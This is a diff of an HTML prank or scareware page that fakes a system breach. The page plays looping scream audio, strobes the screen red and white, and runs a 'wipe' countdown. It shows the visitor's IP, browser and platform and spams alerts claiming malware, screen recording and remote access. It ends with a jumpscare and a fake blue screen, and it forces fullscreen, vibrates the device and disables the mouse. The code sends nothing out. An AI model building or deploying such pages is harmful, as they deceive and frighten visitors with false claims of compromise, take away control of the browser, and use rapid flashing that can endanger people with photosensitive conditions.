@@ -1,40 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>System Crash</title>
+  <meta charset="UTF-8">
+  <title>💀 BROADYG.EXE 💀</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
       margin: 0;
       padding: 0;
       height: 100%;
-      background: black;
+      background-color: black;
+      font-family: monospace;
       color: red;
-      font-family: 'Courier New', monospace;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      animation: flashBg 0.1s infinite;
       overflow: hidden;
+      text-align: center;
     }
 
-    h1, p {
-      animation: shake 0.2s infinite;
-      font-size: 2rem;
+    body.flash {
+      animation: flash-bg 0.1s infinite;
     }
 
-    #ip-address, #countdown {
-      font-size: 1.5rem;
-      color: yellow;
-      animation: flashText 0.8s infinite;
+    @keyframes flash-bg {
+      0% { background: red; }
+      50% { background: white; }
+      100% { background: black; }
     }
 
-    @keyframes flashBg {
-      0%, 100% { background-color: black; }
-      50% { background-color: red; }
+    h1 {
+      font-size: 3rem;
+      margin-top: 80px;
+      animation: shake 0.4s infinite;
     }
 
     @keyframes shake {
@@ -44,82 +39,159 @@
       75% { transform: translate(-2px, 2px); }
     }
 
-    @keyframes flashText {
+    #countdown {
+      font-size: 2rem;
+      margin-top: 20px;
+    }
+
+    #info {
+      font-size: 1.3rem;
+      margin-top: 20px;
+      color: yellow;
+      animation: flash-text 1s infinite;
+    }
+
+    @keyframes flash-text {
       0%, 100% { opacity: 1; }
       50% { opacity: 0; }
+    }
+
+    #jumpscare {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: black;
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #jumpscare img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
     }
 
     #bsod {
       display: none;
       position: fixed;
-      top: 0;
-      left: 0;
-      background-color: #0000AA;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0000aa;
       color: white;
       font-family: monospace;
       font-size: 1.2rem;
       padding: 50px;
-      width: 100vw;
-      height: 100vh;
-      z-index: 9999;
+      z-index: 10000;
+      text-align: left;
     }
   </style>
 </head>
-<body>
-  <h1>🚨 SYSTEM BREACH 🚨</h1>
-  <p>Your device is compromised. Tracking enabled.</p>
-  <div id="ip-address">Fetching IP...</div>
-  <div id="countdown">Time until critical failure: 3:00</div>
+<body class="flash" onmousemove="freezeMouse(event)">
+  <h1>SYSTEM BREACH DETECTED</h1>
+  <div id="countdown">Wipe begins in: 3:00</div>
+  <div id="info">Locating target device...</div>
 
-  <!-- Scream Audio -->
-  <audio autoplay loop>
-    <source src="https://files.catbox.moe/fxq7eq.mp3" type="audio/mp3">
-  </audio>
-
-  <!-- Fake BSOD -->
-  <div id="bsod">
-    <h2>😵 A problem has been detected and Windows has been shut down</h2>
-    <p>DRIVER_IRQL_NOT_LESS_OR_EQUAL</p>
-    <p>If this is the first time you’ve seen this Stop error screen, restart your computer...</p>
-    <p>Technical information: *** STOP: 0x000000D1 (0x00000000, 0x00000002, 0x00000000, 0x00000000)</p>
+  <!-- Screamer -->
+  <div id="jumpscare">
+    <img src="https://media.tenor.com/wC6F0gGEM1gAAAAC/jumpscare.gif" alt="JUMPSCARE">
   </div>
 
-  <script>
-    // Countdown
-    let timeLeft = 180;
-    const countdown = document.getElementById("countdown");
-    setInterval(() => {
-      const min = Math.floor(timeLeft / 60);
-      const sec = timeLeft % 60;
-      countdown.textContent = `Time until critical failure: ${min}:${sec < 10 ? '0' : ''}${sec}`;
-      if (timeLeft <= 0) {
-        document.getElementById("bsod").style.display = "block";
-      } else {
-        timeLeft--;
-      }
-    }, 1000);
+  <!-- Fake Blue Screen -->
+  <div id="bsod">
+    😵 A critical system failure has occurred.<br><br>
+    BROADYG_FATAL_ERROR<br><br>
+    *** STOP: 0x000000FE (BROADYG.EXE, SYSTEM_OVERRUN, 0x00000000)<br>
+    Collecting data for crash dump...<br>
+    Initializing disk for memory dump...<br>
+    Contact your administrator.<br>
+    The system has been halted.<br><br>
+    <i>Thanks for playing 💀</i>
+  </div>
 
-    // IP Fetch
+  <audio id="screamAudio" autoplay loop>
+    <source src="https://files.catbox.moe/h2l3dv.mp3" type="audio/mp3">
+  </audio>
+
+  <script>
+    // COUNTDOWN
+    let time = 180;
+    const countdown = document.getElementById("countdown");
+    const tick = () => {
+      const m = Math.floor(time / 60);
+      const s = time % 60;
+      countdown.textContent = `Wipe begins in: ${m}:${s < 10 ? '0' : ''}${s}`;
+      if (time > 0) {
+        time--;
+        setTimeout(tick, 1000);
+      } else {
+        triggerJumpscare();
+      }
+    };
+    tick();
+
+    // INFO FILLER
+    const info = document.getElementById("info");
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
-        document.getElementById("ip-address").textContent = `Your IP: ${data.ip}`;
+        const browser = navigator.userAgent;
+        const os = navigator.platform;
+        info.innerHTML = `
+          IP: ${data.ip}<br>
+          Device: ${os}<br>
+          Browser: ${browser}
+        `;
       });
 
-    // Fast popups
+    // POP-UP SPAM
     const warnings = [
-      '⚠️ Intrusion Detected!',
-      '💀 Camera Activated',
-      '🔥 Firewall Overridden!',
-      '🩸 Tracking Enabled!',
-      '☠️ Personal Files Accessed!',
-      '📡 IP Address Shared!',
-      '🧠 Remote Control Granted!'
+      "⚠️ Malware Injected!",
+      "🔥 SYSTEM LEAK DETECTED!",
+      "💀 Your screen is being recorded!",
+      "📡 Remote access active!",
+      "🧠 Memory corruption in progress..."
     ];
-
     setInterval(() => {
       alert(warnings[Math.floor(Math.random() * warnings.length)]);
-    }, 2000);
+    }, 1500);
+
+    // JUMPSCARE
+    function triggerJumpscare() {
+      document.getElementById("jumpscare").style.display = "flex";
+      setTimeout(() => {
+        document.getElementById("jumpscare").style.display = "none";
+        document.getElementById("bsod").style.display = "block";
+        document.body.classList.remove("flash");
+        document.getElementById("screamAudio").pause();
+      }, 5000);
+    }
+
+    // FORCE FULLSCREEN
+    document.addEventListener("click", () => {
+      const docElm = document.documentElement;
+      if (docElm.requestFullscreen) docElm.requestFullscreen();
+    });
+
+    // VIBRATION
+    if ("vibrate" in navigator) {
+      setInterval(() => navigator.vibrate([200, 100, 300]), 2000);
+    }
+
+    // FAKE MOUSE FREEZE
+    let frozen = false;
+    function freezeMouse(e) {
+      if (!frozen) {
+        frozen = true;
+        setTimeout(() => {
+          window.scrollTo(0, 0);
+          document.body.style.pointerEvents = "none";
+        }, 7000); // Freeze after 7s
+      }
+    }
   </script>
 </body>
 </html>
